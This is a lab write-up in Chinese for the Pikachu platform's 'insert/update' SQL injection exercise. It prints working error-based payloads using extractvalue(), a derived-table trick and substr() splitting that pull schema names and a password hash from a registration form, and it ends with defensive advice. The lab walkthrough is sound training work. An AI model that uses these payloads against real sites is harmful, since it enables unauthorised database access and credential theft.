【Pikachu】Web-SQL-Inject "insert/update"注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, insert注入, update注入, 报错注入, 32字符限制, extractvalue, 派生表

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称："insert/update"注入
  • 目标：理解数据写入（INSERT/UPDATE）场景下的 SQL 注入原理，掌握利用报错注入（Error-based）获取数据库信息的方法，并突破 MySQL 报错回显 32 字符与同表更新的底层限制。

2. 解题思路与知识点

漏洞原理：

该关卡模拟了用户注册功能。后端代码未对用户输入进行过滤，直接将数据拼接到 INSERT INTO 语句中执行，形如 INSERT INTO member (username, ...) VALUES ('$username', ...)。因为参数被单引号包裹，攻击者需要闭合单引号，并通过逗号构造新的值列表来植入恶意 SQL 语句。由于 INSERT 语句在页面上没有数据查询回显，我们采用 报错注入（Error-based Injection），利用 extractvalue() 或 updatexml() 函数故意制造 XPath 语法错误，将查询结果带出。

工具选型与心路历程：
  • F12抓包与Python脚本：由于是 POST 请求，通过 F12 抓包明确注册接口的参数列表。使用 Python 的 requests.post() 构造并发送注入载荷，便于修改和调试。
  • 报错注入技巧：经过测试，updatexml 在 POST 环境下注释符 # 失效，转为使用 extractvalue 配合 -- （双横线+空格）注释符，成功绕过语法限制。
  • MySQL 32字符限制：在尝试提取 32 位的 MD5 密码哈希时，发现 extractvalue 报错回显有 32 字符的硬性限制，导致哈希被截断，正则匹配不到完整数据。
  • 同表更新限制：使用 substr 分段提取时，触发了 MySQL 的 You can't specify target table 'member' for update in FROM clause 错误。最终利用 派生表（Derived Table） 配合 substr() 函数，成功绕过所有限制，拿到完整的 MD5 密码哈希。

3. 操作步骤

第一步：抓包与参数分析

操作：访问注册页面，填写账号密码等信息（用户名 vince，密码 123456 等），点击提交。按 F12 打开网络面板抓取请求。

分析结果：请求 URL 为 /pikachu/vul/sqli/sqli_iu/sqli_reg.php，请求方式为 POST。Payload 包含 username、password、sex、phonenum、email、add、submit 参数。

第二步：漏洞探测（单引号报错）

操作： 使用 Python 脚本将 username 修改为 vince' 并发送。

回显： 页面报错 You have an error in your SQL syntax; ... near '123456'),'girl'...。

说明： 报错信息完整暴露了 VALUES 列表的结构，证明单引号未被过滤，且注入点存在。

第三步：报错注入获取库名、表名、列名

操作： 使用 extractvalue() 配合逗号闭合构造 Payload。将 username 替换为以下代码：

Payload： vince', extractvalue(1,concat(0x7e,(select database()),0x7e)), '1', '1', '1', '1')--

回显结果：

  • 查库名：~pikachu~
  • 查表名：~httpinfo,member,message,users,x~（因长度限制被截断，已确认存在 member 表）
  • 查列名：~id,username,pw,sex,phonenum,add~（因长度限制被截断，已确认存在 username 和 pw）

第四步：提取密码的失败过程与限制分析

操作 1： 尝试直接提取 member 表的 pw 字段。

Payload： vince', extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e)), '1', '1', '1', '1')--

结果： 脚本无法匹配到 XPATH 报错信息。分析发现，MD5 哈希长度为 32 位，加上波浪号占位符总长度超过 32 字符。MySQL 对 extractvalue 的报错回显有 32 字符的硬性限制，导致数据被截断，无法通过前端页面直接获取完整哈希。

操作 2： 尝试使用 substr 分段提取。

Payload： vince', extractvalue(1,concat(0x7e,substr((select pw from member limit 0,1),1,16),0x7e)), '1', '1', '1', '1')--

结果： 依然失败。报错信息显示 You can't specify target table 'member' for update in FROM clause。这是因为 MySQL 不允许在 INSERT/UPDATE 同一张表（member）时，在子查询中直接 SELECT 这张表的数据。

第五步：终极绕过与提取（派生表 + 分段提取）

操作： 为了解决“32字符限制”和“同表更新限制”，使用 派生表（Derived Table） 技巧。将 member 表的数据包在 as t 里面，欺骗 MySQL 将其视为临时结果集。

Payload： vince', extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),1,16),0x7e)), '1', '1', '1', '1')--

分段查询： 分别查询 substr(...,1,16) 和 substr(...,17,16)，最后在 Python 脚本中拼接。

回显结果： 前端成功报错并回显数据，Python 脚本提取到完整哈希：e10adc3949ba59abbe56e057f20f883e。

4. 踩坑记录与复盘

  • 坑1：POST 环境下注释符 # 失效。 在 POST 请求中，# 常常被服务器或 PHP 解析器当作锚点处理，无法注释后续 SQL。改用 -- （双横线加空格）并在 Python 字典中直接传递，成功解决。
  • 坑2：MySQL 报错注入的 32 字符硬性限制。 extractvalue 和 updatexml 报错回显最多 32 个字符。MD5 哈希恰好占满 32 位，加上波浪号后超长被截断。解决方案是使用 substr() 函数分段提取。
  • 坑3：同表更新限制。 使用 substr 配合子查询时，MySQL 禁止在 INSERT/UPDATE 表 A 时，子查询直接 SELECT 表 A。解决方案是使用派生表：select pw from (select pw from member limit 0,1) as t。

5. 知识总结

  • INSERT/UPDATE 注入核心： 攻击点位于数据写入语句中。需闭合单引号，通过逗号构造新的值列表（如 '1', '1'）来平衡语法，并注意注释符的兼容性。
  • 报错注入（Error-based Injection）： 利用数据库函数（如 extractvalue、updatexml）强制报错，将查询结果拼接在错误信息中返回。适用于无回显的 INSERT/UPDATE 场景。
  • 防御建议： 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；对用户输入进行严格的过滤和转义；对密码使用加盐的强哈希算法（如 bcrypt）进行存储。
